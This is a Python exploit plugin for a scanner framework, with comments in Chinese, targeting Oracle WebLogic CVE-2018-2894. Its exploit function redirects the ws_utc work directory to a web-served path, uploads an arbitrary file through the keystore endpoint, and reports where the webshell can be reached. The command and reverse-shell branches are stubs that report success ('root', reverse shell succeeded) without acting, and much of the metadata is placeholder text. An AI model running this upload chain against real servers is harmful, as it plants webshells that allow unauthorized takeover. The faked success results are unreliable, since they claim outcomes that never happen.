# -*- coding: UTF-8 -*-
# !/usr/bin/python
import requests
import re
import time
import requests
import xml.etree.ElementTree as ET


def vuln_info():
    info = {
        'vuln_name': 'CVE-2018-2894',  # 漏洞名称
        'vuln_referer': '未知',  # 漏洞来源
        'vuln_author': '未知',  # 插件作者
        'cms_name': 'test',  # cms_name需要和上级目录保持一致。扫描器自动添加会调用。GUI版本不会调用
        'vuln_description': '''漏洞描述''',
        'vuln_identifier': '''漏洞编号。''',
        'vuln_class': '漏洞分类',
        # 如：信息泄漏、远程命令执行、任意文件上传、SQL注入、XML注入、任意文件读取、本地文件包含、认证绕过/未认证、弱口令、目录遍历、其他、反序列化漏洞、OGNL表达式注入、SSRF、后门、任意文件下载、鉴权绕过、暴力破解、命令注入、路径泄露、XSS、远程文件包含、CSRF、任意文件包含、代码注入、任意文件写入、密码硬编码、文件包含、任意用户注册、缓冲区溢出、用户枚举漏洞、任意文件删除、任意页面上传、管理权限等
        'vuln_solution': '''修复建议。''',
        'FofaQuery_type': 'socket',  # socket、http
        'FofaQuery_link': '/',  # 此处的路径会加在url拼接访问，进行FofaQuery的条件匹配 此处为all为全部页面都检测
        'FofaQuery_rule': 'title="百度"',
        # header="JSESSIONID" || body="Struts Problem Report" || body="There is no Action mapped for namespace" || body="No result defined for action and result input" || header="Servlet" || header="JBoss",port="60001"
        # header', 'body', 'title', 'banner','port','banner','service','protocol','server'
        'ispoc': 1,  # 是否有poc  1为有 0为无
        'isexp': 1  # 是否有exp   1为有 0为无
    }
    return info


headers = {
    'Content-Type': 'application/x-www-form-urlencoded',
    'X-Requested-With': 'XMLHttpRequest'
}

# url：url  hostname：主机地址  port：端口  scheme：服务  heads：http自定义头信息
def do_poc(url,hostname,port,scheme,heads={},func_out=print,plugins_temp_data={}):
    try:
        # 返回参数
        # Result返回是否存在，
        # Result_Info为返回的信息，可以为Paylaod
        # Debug debug信息 默认不会显示，勾选显示调试信息会输出此结果
        # Error_Info无论何时都会输出
        heads = headers
        result = {"Result": False, "Result_Info": "payload", "Debug_Info": "", "Error_Info": ""}
        result['Result_Info'] = 'payload'
        request = requests.get(url+"/ws_utc/resources/setting/options/general", headers=heads,)
        if "</defaultValue>" in request.text:
            result['Result'] =True
            result['Result_Info']= "无"
        return result
    except Exception as e:
        func_out('Error',str(e)+str(e.__traceback__.tb_lineno)+'行')

    # {
    #     "type":"cmd",  #cmd,shell,uploadfile
    #     "command":"whoami",  #cmd命令
    #     "reverse_ip":"127.0.0.1", #反弹shell的ip
    #     "reverse_port":"8888", #反弹shell的端口
    #     "filename":"conf.php", #写入文件的名字
    #     "filename_contents":"shell内容", #shell文件内容
    # }


# url:url   hostname：主机地址  port：端口  scheme：服务  heads:自定义请求头





def get_current_work_path(host):
    geturl = host + "/ws_utc/resources/setting/options/general"
    ua = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:49.0) Gecko/20100101 Firefox/49.0'}
    values = []
    try:
        request = requests.get(geturl)
        if request.status_code == 404:
            return False
            # exit("[-] {}  don't exists CVE-2018-2894".format(host))
        elif "Deploying Application".lower() in request.text.lower():
            print("[*] First Deploying Website Please wait a moment ...")
            time.sleep(20)
            request = requests.get(geturl, headers=ua)
        if "</defaultValue>" in request.text:
            root = ET.fromstring(request.content)
            value = root.find("section").find("options")
            for e in value:
                for sub in e:
                    if e.tag == "parameter" and sub.tag == "defaultValue":
                        values.append(sub.text)
    except requests.ConnectionError:
        return False

        # exit("[-] Cannot connect url: {}".format(geturl))
    if values:
        return values[0]
    else:
        print("[-] Cannot get current work path\n")
        return False

        # exit(request.content)


def get_new_work_path(host):
    origin_work_path = get_current_work_path(host)
    works = "/servers/AdminServer/tmp/_WL_internal/com.oracle.webservices.wls.ws-testclient-app-wls/4mcj4y/war/css"
    if "user_projects" in origin_work_path:
        if "\\" in origin_work_path:
            works = works.replace("/", "\\")
            current_work_home = origin_work_path[:origin_work_path.find("user_projects")] + "user_projects\\domains"
            dir_len = len(current_work_home.split("\\"))
            domain_name = origin_work_path.split("\\")[dir_len]
            current_work_home += "\\" + domain_name + works
        else:
            current_work_home = origin_work_path[:origin_work_path.find("user_projects")] + "user_projects/domains"
            dir_len = len(current_work_home.split("/"))
            domain_name = origin_work_path.split("/")[dir_len]
            current_work_home += "/" + domain_name + works
    else:
        current_work_home = origin_work_path
        print("[*] cannot handle current work home dir: {}".format(origin_work_path))
    return current_work_home


def set_new_upload_path(host, path):
    data = {
        "setting_id": "general",
        "BasicConfigOptions.workDir": path,
        "BasicConfigOptions.proxyHost": "",
        "BasicConfigOptions.proxyPort": "80"}
    request = requests.post(host + "/ws_utc/resources/setting/options", data=data, headers=headers,verify=False)
    if "successfully" in request.text:
        return True
    else:
        print("[-] Change New Upload Path failed")
        return request.content
        # exit(request.content)


def upload_webshell(host, uri, files={}):
    set_new_upload_path(host, get_new_work_path(host))

    request = requests.post(host + uri, files=files,verify=False)
    response = request.text
    match = re.findall("<id>(.*?)</id>", response)
    return match


def do_exp(url,hostname,port,scheme,heads={},exp_data={},func_out=print,plugins_temp_data={}):
    try:
        # 返回参数
        # Result返回是否成功，
        # Result_Info为返回的信息，可以为Paylaod
        # Debug debug信息 默认不会显示，勾选显示调试信息会输出此结果
        # Error_Info无论何时都会输出
        result = {"Result": False, "Result_Info": "payload", "Debug_Info": "", "Error_Info": ""}
        # 命令执行
        if exp_data['type'] == 'cmd':
            result['Result'] = True
            result['Result_Info'] = "root"
        # 反弹shell
        if exp_data['type'] == 'shell':
            result['Result'] = True
            result['Result_Info'] = "反弹成功"
        # 上传文件
        if exp_data['type'] == 'uploadfile':
            files = {
                "ks_edit_mode": "false",
                "ks_password_front": "xh",
                "ks_password_changed": "true",
                "ks_filename": (exp_data['filename'], exp_data['filename_contents'])
                }
            match = upload_webshell(url, "/ws_utc/resources/setting/keystore", files)
            if match:
                tid = match[-1]
                shell_path = url + "/ws_utc/css/config/keystore/" + str(tid) + "_" + exp_data['filename']
                if  exp_data['filename_contents'] in requests.get(shell_path, headers=headers,verify=False).text:
                    result['Result'] = True
                    result['Result_Info'] = '上传成功\n上传路径为:'+shell_path
                else:
                    result['Result_Info'] = '上传失败'
            else:
                result['Result_Info'] = '上传失败'
        return result
    except Exception as e:
        func_out('Error',str(e)+str(e.__traceback__.tb_lineno)+'行')

